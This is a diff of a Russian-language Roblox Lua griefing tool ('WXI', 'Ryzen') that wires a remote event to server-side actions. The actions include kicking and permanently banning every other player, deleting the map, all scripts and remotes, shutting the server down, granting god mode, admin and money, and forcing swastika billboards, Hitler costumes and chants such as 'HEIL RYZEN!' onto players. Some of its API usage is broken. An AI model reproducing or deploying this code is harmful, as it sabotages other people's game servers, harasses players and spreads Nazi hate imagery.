+-- 10. ВСЕ ФУНКЦИИ (ОПТИМИЗИРОВАННЫЕ)
+-- ============================================================
+
+local function doZig()
+    local count = 0
+    for _, plr in pairs(Players:GetPlayers()) do
+        count = count + 1
+        if count > 50 then task.wait(0.05) end
+        pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("Humanoid") then
                 local anim = Instance.new("Animation")
                 anim.AnimationId = "rbxassetid://148840371"
                 local track = char.Humanoid:LoadAnimation(anim)
                 track:Play()
+                task.wait(0.01)
             end
-        end
-    ]])
-end, 4)
+        end)
+    end
+end
 
-createButton("🌅 КРОВАВОЕ НЕБО", function()
-    executeServerCode([[
-        local sky = game.Lighting:FindFirstChild("Sky") or Instance.new("Sky", game.Lighting)
+local function doSwastika()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local char = plr.Character
+            if char and char:FindFirstChild("Head") then
+                for _, child in ipairs(char.Head:GetChildren()) do
+                    if child:IsA("BillboardGui") and child.Name == "SwastikaGUI" then
+                        child:Destroy()
+                    end
+                end
+                local bill = Instance.new("BillboardGui")
+                bill.Name = "SwastikaGUI"
+                bill.Size = UDim2.new(0, 3, 0, 3)
+                bill.AlwaysOnTop = true
+                local img = Instance.new("ImageLabel")
+                img.Image = "rbxassetid://1234567890"
+                img.Size = UDim2.new(1,0,1,0)
+                img.BackgroundTransparency = 1
+                img.Parent = bill
+                bill.Parent = char.Head
+            end
+        end)
+    end
+end
+
+local function doHellSky()
+    pcall(function()
+        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
+        sky.SkyboxBk = "rbxassetid://10221158754"
+        sky.SkyboxDn = "rbxassetid://10221158754"
+        sky.SkyboxLf = "rbxassetid://10221158754"
+        sky.SkyboxRt = "rbxassetid://10221158754"
+        sky.SkyboxUp = "rbxassetid://10221158754"
+        Lighting.FogColor = Color3.fromRGB(255,0,0)
+        Lighting.FogEnd = 150
+        Lighting.Brightness = 0.5
+    end)
+end
+
+local function doBloodySky()
+    pcall(function()
+        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
         sky.SkyboxBk = "rbxassetid://15050311563"
         sky.SkyboxDn = "rbxassetid://15050311563"
         sky.SkyboxLf = "rbxassetid://15050311563"
         sky.SkyboxRt = "rbxassetid://15050311563"
         sky.SkyboxUp = "rbxassetid://15050311563"
-        game.Lighting.FogColor = Color3.fromRGB(200,50,50)
-        game.Lighting.Brightness = 2
-    ]])
-end, 5)
+        Lighting.FogColor = Color3.fromRGB(200,50,50)
+        Lighting.FogEnd = 200
+        Lighting.Brightness = 2
+    end)
+end
 
-createButton("🎮 СПАВН ТАНКА", function()
-    executeServerCode([[
-        local tank = Instance.new("Model", game.Workspace)
+local function doTeleport()
+    local placeId = game.PlaceId
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function() TeleportService:Teleport(placeId, plr) end)
+        task.wait(0.05)
+    end
+end
+
+local function doSpawnTank()
+    if not CONFIG.TANK_ENABLED then return end
+    pcall(function()
+        local tank = Instance.new("Model")
         tank.Name = "RyzenTank"
-        local body = Instance.new("Part", tank)
+        local body = Instance.new("Part")
         body.Size = Vector3.new(8,2,5)
         body.BrickColor = BrickColor.new("Dark green")
         body.Position = Vector3.new(0,2,0)
-        local turret = Instance.new("Part", tank)
+        body.Anchored = false
+        body.Parent = tank
+        local turret = Instance.new("Part")
         turret.Size = Vector3.new(3,1.5,3)
         turret.BrickColor = BrickColor.new("Dark green")
         turret.Position = Vector3.new(0,3.5,0)
+        turret.Anchored = false
+        turret.Parent = tank
+        for x = -1,1,2 do for z = -1,1,2 do
+            local wheel = Instance.new("Part")
+            wheel.Size = Vector3.new(0.8,0.8,0.5)
+            wheel.BrickColor = BrickColor.new("Black")
+            wheel.Position = Vector3.new(x*2.5,0.5,z*2)
+            wheel.Anchored = false
+            wheel.Parent = tank
+        end end
+        tank.Parent = Workspace
         Debris:AddItem(tank, 60)
-    ]])
-end, 6)
+    end)
+end
 
-createButton("💀 УНИЧТОЖИТЬ КАРТУ", function()
-    executeServerCode([[
-        for _, v in pairs(game.Workspace:GetChildren()) do
-            if v:IsA("BasePart") and not v:IsDescendantOf(game.Players) then
-                v:Destroy()
-            end
-        end
-    ]])
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "💀 КАРТА",
-        Text = "Карта уничтожена!",
-        Duration = 3
-    })
-end, 7)
+local function doBigEffects()
+    for i = 1, CONFIG.EFFECTS_COUNT do
+        pcall(function()
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(10,10,10)
+            part.Position = Vector3.new(math.random(-60,60), math.random(0,15), math.random(-60,60))
+            part.Material = Enum.Material.Neon
+            part.Color = Color3.fromRGB(math.random(200,255), math.random(0,50), math.random(0,50))
+            part.Anchored = true
+            part.CanCollide = false
+            part.Transparency = 0.3
+            part.Parent = Workspace
+            Debris:AddItem(part, 2)
+        end)
+        task.wait(0.05)
+    end
+end
 
-createButton("👢 КИКНУТЬ ВСЕХ", function()
-    executeServerCode([[
-        local player = game.Players.LocalPlayer
-        for _, plr in pairs(game.Players:GetPlayers()) do
-            if plr ~= player then
-                plr:Kick("💀 KICKED BY RYZEN SYSTEM")
-            end
-        end
-    ]])
-end, 8)
+local music = nil
+local function doPlayMusic()
+    if not CONFIG.MUSIC_ENABLED then return end
+    pcall(function()
+        if music then music:Stop() music:Destroy() music = nil end
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://9116468226"
+        sound.Volume = 0.3
+        sound.Looped = true
+        sound.Parent = Workspace
+        sound:Play()
+        music = sound
+    end)
+end
 
-createButton("👑 ВЫДАТЬ АДМИНКУ ВСЕМ", function()
-    executeServerCode([[
-        for _, plr in pairs(game.Players:GetPlayers()) do
+local function doStopMusic()
+    pcall(function() if music then music:Stop() music:Destroy() music = nil end end)
+end
+
+local function doDanceAll(danceType)
+    local danceIds = {
+        ["default"] = "rbxassetid://148840371",
+        ["robot"] = "rbxassetid://507771000",
+        ["gangnam"] = "rbxassetid://2554341089"
+    }
+    local animId = danceIds[danceType] or danceIds["default"]
+    local count = 0
+    for _, plr in pairs(Players:GetPlayers()) do
+        count = count + 1
+        if count > 30 then task.wait(0.03) end
+        pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.MaxHealth = math.huge
-                char.Humanoid.Health = math.huge
-                char.Humanoid.WalkSpeed = 50
-                char.Humanoid.JumpPower = 100
+                for _, track in ipairs(char.Humanoid:GetPlayingAnimationTracks()) do track:Stop() end
+                local anim = Instance.new("Animation")
+                anim.AnimationId = animId
+                local track = char.Humanoid:LoadAnimation(anim)
+                track.Looped = true
+                track:Play()
             end
+        end)
+    end
+end
+
+local function doHitlerAll()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local char = plr.Character
+            if char then
+                local shirt = char:FindFirstChild("Shirt")
+                local pants = char:FindFirstChild("Pants")
+                if shirt then shirt.ShirtTemplate = "rbxassetid://1234567890" end
+                if pants then pants.PantsTemplate = "rbxassetid://1234567890" end
+                local mustache = Instance.new("Part")
+                mustache.Size = Vector3.new(0.4,0.1,0.1)
+                mustache.BrickColor = BrickColor.new("Really black")
+                mustache.Position = char.Head.Position + Vector3.new(0,-0.2,0.4)
+                mustache.Anchored = true
+                mustache.CanCollide = false
+                mustache.Parent = char.Head
+            end
+        end)
+    end
+end
+
+local function doBloodyTextures()
+    for _, part in pairs(Workspace:GetDescendants()) do
+        pcall(function()
+            if part:IsA("BasePart") and not part:IsDescendantOf(Players) and part.Name ~= "x1x1x1x1_BOSS" then
+                part.Color = Color3.fromRGB(math.random(150,255),0,0)
+                part.Material = Enum.Material.SmoothPlastic
+            end
+        end)
+    end
+    pcall(function()
+        Lighting.FogColor = Color3.fromRGB(180,0,0)
+        Lighting.FogEnd = 80
+        Lighting.Brightness = 0.4
+    end)
+end
+
+local zombieConnections = {}
+local function doZombieWalk()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local char = plr.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.WalkSpeed = 8
+                char.Humanoid.JumpPower = 0
+                if not zombieConnections[plr] then
+                    zombieConnections[plr] = RunService.Heartbeat:Connect(function()
+                        if char and char:FindFirstChild("HumanoidRootPart") then
+                            local root = char.HumanoidRootPart
+                            root.RotVelocity = Vector3.new(math.sin(tick()*2)*0.5,0,math.cos(tick()*2)*0.5)
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+end
+
+local function doRandomTeleport()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local char = plr.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.Position = Vector3.new(math.random(-80,80), 10, math.random(-80,80))
+            end
+        end)
+    end
+end
+
+local function doHellWeather()
+    for i = 1, CONFIG.RAIN_COUNT do
+        pcall(function()
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(0.3,0.3,0.3)
+            part.Position = Vector3.new(math.random(-120,120), math.random(30,80), math.random(-120,120))
+            part.BrickColor = BrickColor.new("Bright red")
+            part.Material = Enum.Material.Neon
+            part.Anchored = false
+            part.CanCollide = false
+            part.Velocity = Vector3.new(0,-15,0)
+            part.Parent = Workspace
+            Debris:AddItem(part, 4)
+        end)
+        task.wait(0.02)
+    end
+end
+
+local function doChatSpam()
+    local messages = {"HEIL RYZEN!", "СЛАВА РЕЙХУ!", "МЫ ИДЁМ!", "КРОВЬ ЗА КРОВЬ!"}
+    for _, plr in pairs(Players:GetPlayers()) do
+        for i = 1, 3 do
+            pcall(function() plr:Chat(messages[math.random(1,#messages)]) end)
+            task.wait(0.2)
+        end
+    end
+end
+
+local function doBloodMonster()
+    pcall(function()
+        local monster = Instance.new("Model")
+        monster.Name = "BloodMonster"
+        for i = 1, 15 do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(math.random(3,10), math.random(3,10), math.random(3,10))
+            part.Position = Vector3.new(math.random(-25,25), math.random(0,15), math.random(-25,25))
+            part.BrickColor = BrickColor.new("Bright red")
+            part.Material = Enum.Material.Neon
+            part.Anchored = true
+            part.CanCollide = false
+            part.Transparency = 0.3
+            part.Parent = monster
+        end
+        monster.Parent = Workspace
+        Debris:AddItem(monster, 20)
+    end)
+end
+
+local function doMapDestroy()
+    for _, v in pairs(Workspace:GetChildren()) do
+        pcall(function()
+            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
+                v:Destroy()
+            end
+        end)
+    end
+    if tiltGroup and tiltGroup.Parent then
+        tiltGroup:Destroy()
+        tiltGroup = nil
+    end
+    createApocalypseMap()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local char = plr.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.Position = Vector3.new(math.random(-40,40), 10, math.random(-40,40))
+            end
+        end)
+    end
+    globalNotify("🌋 НОВАЯ КАРТА СОЗДАНА!", Color3.fromRGB(255,0,0), 4)
+end
+
+local function doHellMap()
+    for i = 1, CONFIG.LAVA_COUNT do
+        pcall(function()
+            local lava = Instance.new("Part")
+            lava.Size = Vector3.new(5,0.5,5)
+            lava.Position = Vector3.new(math.random(-120,120), 0, math.random(-120,120))
+            lava.BrickColor = BrickColor.new("Bright orange")
+            lava.Material = Enum.Material.Neon
+            lava.Anchored = true
+            lava.CanCollide = false
+            lava.Transparency = 0.5
+            lava.Parent = Workspace
+            Debris:AddItem(lava, 15)
+        end)
+        task.wait(0.02)
+    end
+end
+
+local function doGraveyard()
+    for i = 1, 20 do
+        pcall(function()
+            local grave = Instance.new("Part")
+            grave.Size = Vector3.new(1,0.5,2)
+            grave.Position = Vector3.new(math.random(-70,70), 0.5, math.random(-70,70))
+            grave.BrickColor = BrickColor.new("Dark grey")
+            grave.Material = Enum.Material.Sandstone
+            grave.Anchored = true
+            grave.Parent = Workspace
+            local cross = Instance.new("Part")
+            cross.Size = Vector3.new(0.3,2,0.3)
+            cross.Position = grave.Position + Vector3.new(0,1.5,0)
+            cross.BrickColor = BrickColor.new("Dark grey")
+            cross.Anchored = true
+            cross.Parent = Workspace
+        end)
+    end
+end
+
+local function doFlipScreen()
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local gui = plr.PlayerGui:FindFirstChild("RyzenGUI")
+            if gui then gui.Rotation = 180 end
+        end)
+    end
+end
+
+local function doRenameTroll()
+    local names = {"Hitler", "Stalin", "Mussolini", "Mao", "Kim"}
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local name = names[math.random(1,#names)]
+            plr.DisplayName = name
+            plr.Name = name
+        end)
+    end
+end
+
+local function doScareAll(plr)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= plr then
+            pcall(function()
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://9104997024"
+                sound.Volume = 1
+                sound.Parent = Workspace
+                sound:Play()
+                Debris:AddItem(sound, 3)
+                
+                local g = Instance.new("ScreenGui")
+                g.Name = "ScareGUI"
+                g.ResetOnSpawn = false
+                g.Parent = p.PlayerGui
+                local f = Instance.new("Frame")
+                f.Size = UDim2.new(1,0,1,0)
+                f.BackgroundColor3 = Color3.fromRGB(255,0,0)
+                f.BackgroundTransparency = 0
+                f.Parent = g
+                task.wait(0.2)
+                f:TweenBackgroundTransparency(1, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+                task.wait(0.4)
+                g:Destroy()
+            end)
+        end
+    end
+end
+
+local function doOneDotMap()
+    for _, v in pairs(Workspace:GetDescendants()) do
+        pcall(function()
+            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
+                v.Size = Vector3.new(1,1,1)
+                v.Color = Color3.fromRGB(math.random(50,255), math.random(50,255), math.random(50,255))
+                v.Material = Enum.Material.SmoothPlastic
+            end
+        end)
+    end
+end
+
+local function doScaryEffects()
+    for i = 1, 15 do
+        pcall(function()
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(0.3,0.3,0.3)
+            p.Position = Vector3.new(math.random(-150,150), math.random(30,80), math.random(-150,150))
+            p.BrickColor = BrickColor.new("Bright red")
+            p.Material = Enum.Material.Neon
+            p.Anchored = false
+            p.CanCollide = false
+            p.Velocity = Vector3.new(0,-12,0)
+            p.Parent = Workspace
+            Debris:AddItem(p, 3)
+        end)
+    end
+    for i = 1, 3 do
+        pcall(function()
+            local flash = Instance.new("Part")
+            flash.Size = Vector3.new(1,30,1)
+            flash.Position = Vector3.new(math.random(-80,80), math.random(15,30), math.random(-80,80))
+            flash.BrickColor = BrickColor.new("White")
+            flash.Material = Enum.Material.Neon
+            flash.Anchored = true
+            flash.CanCollide = false
+            flash.Transparency = 0.5
+            flash.Parent = Workspace
+            Debris:AddItem(flash, 0.3)
+            local thunder = Instance.new("Sound")
+            thunder.SoundId = "rbxassetid://9120390372"
+            thunder.Volume = 0.6
+            thunder.Parent = Workspace
+            thunder:Play()
+            Debris:AddItem(thunder, 1.5)
+        end)
+    end
+end
+
+local function doGiveAK(plr)
+    pcall(function()
+        local tool = Instance.new("Tool")
+        tool.Name = "AK-47"
+        tool.RequiresHandle = true
+        tool.Parent = plr.Backpack
+        local handle = Instance.new("Part")
+        handle.Size = Vector3.new(1,0.5,2)
+        handle.BrickColor = BrickColor.new("Really black")
+        handle.Material = Enum.Material.SmoothPlastic
+        handle.Parent = tool
+        local script = Instance.new("Script")
+        script.Name = "GunScript"
+        script.Source = [[
+            local tool = script.Parent
+            local player = game.Players.LocalPlayer
+            local char = player.Character
+            tool.Activated:Connect(function()
+                if not char then return end
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(0.2,0.2,0.2)
+                part.BrickColor = BrickColor.new("Bright red")
+                part.Material = Enum.Material.Neon
+                part.CanCollide = false
+                part.Position = tool.Handle.Position + (char:FindFirstChild("Right Arm") and char.RightArm.CFrame.LookVector*3 or Vector3.new(0,0,0))
+                part.Velocity = (char:FindFirstChild("Right Arm") and char.RightArm.CFrame.LookVector*200 or Vector3.new(0,0,0))
+                part.Parent = game.Workspace
+                game:GetService("Debris"):AddItem(part, 2)
+                part.Touched:Connect(function(hit)
+                    if hit.Parent and hit.Parent:FindFirstChild("Humanoid") and hit.Parent ~= char then
+                        hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 20
+                    end
+                end)
+            end)
+        ]]
+        script.Parent = tool
+    end)
+end
+
+local function doGiveAKAll()
+    for _, p in pairs(Players:GetPlayers()) do
+        doGiveAK(p)
+        task.wait(0.02)
+    end
+end
+
+local function doRemoveAKAll()
+    for _, p in pairs(Players:GetPlayers()) do
+        pcall(function()
+            for _, v in pairs(p.Backpack:GetChildren()) do
+                if v:IsA("Tool") and v.Name == "AK-47" then v:Destroy() end
+            end
+            if p.Character then
+                for _, v in pairs(p.Character:GetChildren()) do
+                    if v:IsA("Tool") and v.Name == "AK-47" then v:Destroy() end
+                end
+            end
+        end)
+    end
+end
+
+local function doGiveAdmin(plr)
+    pcall(function()
+        local char = plr.Character
+        if char then
+            local adminScript = Instance.new("Script")
+            adminScript.Name = "__RyzenAdmin__"
+            adminScript.Source = [[
+                local player = game.Players.LocalPlayer
+                local char = player.Character
+                if char and char:FindFirstChild("Humanoid") then
+                    char.Humanoid.MaxHealth = math.huge
+                    char.Humanoid.Health = math.huge
+                    char.Humanoid.WalkSpeed = 50
+                    char.Humanoid.JumpPower = 100
+                end
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "🔓 ADMIN ACTIVATED",
+                    Text = "Полный контроль!",
+                    Duration = 5
+                })
+            ]]
+            adminScript.Parent = plr.PlayerGui
             plr.DisplayName = "[ADMIN] " .. plr.DisplayName
         end
-    ]])
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "👑 АДМИНКА",
-        Text = "Всем выданы права!",
-        Duration = 3
-    })
-end, 9)
+    end)
+end
+
+local function doGiveAdminAll()
+    for _, plr in pairs(Players:GetPlayers()) do
+        doGiveAdmin(plr)
+        task.wait(0.02)
+    end
+end
+
+local function doGiveItems(plr, itemType)
+    if itemType == "money" then
+        pcall(function()
+            local ls = plr:FindFirstChild("leaderstats")
+            if ls then
+                local cash = ls:FindFirstChild("Cash") or ls:FindFirstChild("Money")
+                if cash then cash.Value = cash.Value + 100000 end
+            end
+        end)
+    elseif itemType == "weapons" then
+        for _, v in pairs(ReplicatedStorage:GetChildren()) do
+            pcall(function()
+                if v:IsA("Tool") and (v.Name:lower():match("gun") or v.Name:lower():match("sword")) then
+                    v:Clone().Parent = plr.Backpack
+                end
+            end)
+        end
+    elseif itemType == "all" then
+        for _, v in pairs(ReplicatedStorage:GetChildren()) do
+            pcall(function()
+                if v:IsA("Tool") then v:Clone().Parent = plr.Backpack end
+            end)
+        end
+        pcall(function()
+            local ls = plr:FindFirstChild("leaderstats")
+            if ls then
+                local cash = ls:FindFirstChild("Cash") or ls:FindFirstChild("Money")
+                if cash then cash.Value = cash.Value + 999999 end
+            end
+        end)
+    end
+end
+
+local function doGodMode(plr)
+    pcall(function()
+        local char = plr.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.MaxHealth = math.huge
+            char.Humanoid.Health = math.huge
+            char.Humanoid.BreakJointsOnDeath = false
+            local godScript = Instance.new("Script")
+            godScript.Name = "__GodMode__"
+            godScript.Source = [[
+                local player = game.Players.LocalPlayer
+                while player.Character do
+                    task.wait(0.1)
+                    local char = player.Character
+                    if char and char:FindFirstChild("Humanoid") then
+                        char.Humanoid.Health = char.Humanoid.MaxHealth
+                    end
+                end
+            ]]
+            godScript.Parent = plr.PlayerGui
+        end
+    end)
+end
+
+local function doKickAll(plr, msg)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= plr then pcall(function() p:Kick(msg or "🔨 KICKED BY RYZEN") end) end
+        task.wait(0.01)
+    end
+end
+
+local function doBanAll(plr)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= plr then
+            pcall(function()
+                p:Kick("🚫 PERMABANNED BY RYZEN")
+                pcall(function()
+                    game:GetService("DataStoreService"):GetDataStore("Bans"):SetAsync(p.UserId, true)
+                end)
+            end)
+        end
+        task.wait(0.01)
+    end
+end
+
+local function doDeleteMapPermanently()
+    for _, v in pairs(game:GetDescendants()) do
+        pcall(function()
+            if v:IsA("Script") or v:IsA("LocalScript") then
+                if v.Name:lower():match("map") or v.Name:lower():match("spawn") or v.Name:lower():match("generate") then
+                    v.Disabled = true
+                    v:Destroy()
+                end
+            end
+        end)
+    end
+    for _, v in pairs(Workspace:GetChildren()) do
+        pcall(function()
+            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
+                v:Destroy()
+            end
+        end)
+    end
+end
+
+local function doNukeServer()
+    globalNotify("🔥 СЕРВЕР УНИЧТОЖАЕТСЯ! ВЫ БУДЕТЕ ПЕРЕЗАГРУЖЕНЫ 🔥", Color3.fromRGB(255,255,255), 5)
+    task.wait(2)
+    for _, v in pairs(game:GetDescendants()) do
+        pcall(function()
+            if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then
+                v.Disabled = true
+                v:Destroy()
+            end
+        end)
+    end
+    for _, v in pairs(Workspace:GetChildren()) do
+        pcall(function() v:Destroy() end)
+    end
+    for _, v in pairs(game:GetDescendants()) do
+        pcall(function()
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                v:Destroy()
+            end
+        end)
+    end
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            for _, gui in pairs(plr.PlayerGui:GetChildren()) do
+                gui:Destroy()
+            end
+        end)
+    end
+    pcall(function()
+        Lighting.Brightness = 0
+        Lighting.Ambient = Color3.fromRGB(0,0,0)
+        Lighting.FogEnd = 0
+    end)
+    task.wait(2)
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function() plr:Kick("💀 СЕРВЕР УНИЧТОЖЕН 1x1x1x1 💀") end)
+    end
+    pcall(function()
+        local placeId = game.PlaceId
+        TeleportService:Teleport(placeId, player)
+    end)
+    pcall(function() game:Shutdown() end)
+end
 
 -- ============================================================
--- 15. ГОРЯЧИЕ КЛАВИШИ (X - СКРЫТЬ/ПОКАЗАТЬ)
+-- 11. ОБРАБОТЧИК КОМАНД
 -- ============================================================
 
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if not gpe and input.KeyCode == Enum.KeyCode.X and mainFrame.Parent then
-        mainFrame.Visible = not mainFrame.Visible
+remote.OnServerEvent:Connect(function(plr, action, data)
+    if action == "zig" then doZig()
+    elseif action == "swastika" then doSwastika()
+    elseif action == "hellsky" then doHellSky()
+    elseif action == "bloodysky" then doBloodySky()
+    elseif action == "teleport" then doTeleport()
+    elseif action == "tank" then doSpawnTank()
+    elseif action == "effects" then doBigEffects()
+    elseif action == "music" then doPlayMusic()
+    elseif action == "stopmusic" then doStopMusic()
+    elseif action == "dance" then doDanceAll(data or "default")
+    elseif action == "hitler" then doHitlerAll()
+    elseif action == "bloody" then doBloodyTextures()
+    elseif action == "zombie" then doZombieWalk()
+    elseif action == "randomtp" then doRandomTeleport()
+    elseif action == "hellweather" then doHellWeather()
+    elseif action == "chatspam" then doChatSpam()
+    elseif action == "bloodmonster" then doBloodMonster()
+    elseif action == "mapdestroy" then doMapDestroy()
+    elseif action == "hellmap" then doHellMap()
+    elseif action == "graveyard" then doGraveyard()
+    elseif action == "flipscreen" then doFlipScreen()
+    elseif action == "renametroll" then doRenameTroll()
+    elseif action == "scareall" then doScareAll(plr)
+    elseif action == "onedotmap" then doOneDotMap()
+    elseif action == "scaryeffects" then doScaryEffects()
+    elseif action == "giveak" then doGiveAK(plr)
+    elseif action == "giveakall" then doGiveAKAll()
+    elseif action == "removeakall" then doRemoveAKAll()
+    elseif action == "deletemap" then doDeleteMapPermanently()
+    elseif action == "createmap" then createApocalypseMap()
+    elseif action == "replacemap" then doMapDestroy()
+    elseif action == "tilt" then
+        local angle = tonumber(data) or 15
+        smoothTilt(angle, "X", 2)
+    elseif action == "tiltz" then
+        local angle = tonumber(data) or 15
+        smoothTilt(angle, "Z", 2)
+    elseif action == "resettilt" then
+        smoothTilt(0, "X", 1.5)
+    elseif action == "nuke" then doNukeServer()
+    elseif action == "giveadmin" then doGiveAdmin(plr)
+    elseif action == "giveadminall" then doGiveAdminAll()
+    elseif action == "giveitems" then doGiveItems(plr, data or "all")
+    elseif action == "notify" then globalNotify(data or "⚠️ ВНИМАНИЕ!", Color3.fromRGB(255,255,255), 8)
+    elseif action == "godmode" then doGodMode(plr)
+    elseif action == "kickall" then doKickAll(plr, data)
+    elseif action == "banall" then doBanAll(plr)
     end
 end)
 
 -- ============================================================
--- 16. ЗАПУСК
+-- 12. КРАСИВЫЙ ЛАУНЧЕР
 -- ============================================================
 
-task.spawn(animateLoading)
+local function createBeautifulLauncher()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "RyzenLauncher"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player.PlayerGui
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-print("✅ WXI v666 ACTIVE")
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    bg.BackgroundTransparency = 0.6
+    bg.Parent = screenGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 500, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
+    mainFrame.BackgroundTransparency = 1
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 20)
+    mainCorner.Parent = mainFrame
+
+    local neonLine = Instance.new("Frame")
+    neonLine.Size = UDim2.new(0.8, 0, 0, 3)
+    neonLine.Position = UDim2.new(0.1, 0, 0, 0)
+    neonLine.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    neonLine.BorderSizePixel = 0
+    neonLine.Parent = mainFrame
+    Instance.new("UICorner", neonLine).CornerRadius = UDim.new(0, 2)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 70)
+    title.Position = UDim2.new(0, 0, 0, 20)
+    title.BackgroundTransparency = 1
+    title.Text = "⚡ WXI ⚡"
+    title.TextColor3 = Color3.fromRGB(0, 200, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0, 30)
+    subtitle.Position = UDim2.new(0, 0, 0, 85)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "ВВЕДИТЕ ПАРОЛЬ ДЛЯ ДОСТУПА"
+    subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.Parent = mainFrame
+
+    local passwordBox = Instance.new("TextBox")
+    passwordBox.Size = UDim2.new(0.75, 0, 0, 50)
+    passwordBox.Position = UDim2.new(0.125, 0, 0, 140)
+    passwordBox.BackgroundColor3 = Color3.fromRGB(25, 20, 40)
+    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    passwordBox.Text = ""
+    passwordBox.PlaceholderText = "🔑 Введите пароль..."
+    passwordBox.Font = Enum.Font.Gotham
+    passwordBox.TextScaled = true
+    passwordBox.ClearTextOnFocus = false
+    passwordBox.BorderSizePixel = 0
+    passwordBox.Parent = mainFrame
+    Instance.new("UICorner", passwordBox).CornerRadius = UDim.new(0, 10)
+
+    local loginButton = Instance.new("TextButton")
+    loginButton.Size = UDim2.new(0.4, 0, 0, 50)
+    loginButton.Position = UDim2.new(0.3, 0, 0, 210)
+    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    loginButton.Text = "🔓 ВОЙТИ"
+    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loginButton.TextScaled = true
+    loginButton.Font = Enum.Font.GothamBold
+    loginButton.BorderSizePixel = 0
+    loginButton.Parent = mainFrame
+    Instance.new("UICorner", loginButton).CornerRadius = UDim.new(0, 10)
+
+    local loadFrame = Instance.new("Frame")
+    loadFrame.Size = UDim2.new(0.7, 0, 0, 8)
+    loadFrame.Position = UDim2.new(0.15, 0, 0, 280)
+    loadFrame.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
+    loadFrame.BackgroundTransparency = 1
+    loadFrame.Parent = mainFrame
+    Instance.new("UICorner", loadFrame).CornerRadius = UDim.new(0, 4)
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    progressBar.BackgroundTransparency = 0
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = loadFrame
+    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 4)
+
+    local loadText = Instance.new("TextLabel")
+    loadText.Size = UDim2.new(1, 0, 0, 25)
+    loadText.Position = UDim2.new(0, 0, 0, 295)
+    loadText.BackgroundTransparency = 1
+    loadText.Text = ""
+    loadText.TextColor3 = Color3.fromRGB(150, 200, 255)
+    loadText.TextScaled = true
+    loadText.Font = Enum.Font.Gotham
+    loadText.Parent = mainFrame
+
+    local errorText = Instance.new("TextLabel")
+    errorText.Size = UDim2.new(1, 0, 0, 30)
+    errorText.Position = UDim2.new(0, 0, 0, 330)
+    errorText.BackgroundTransparency = 1
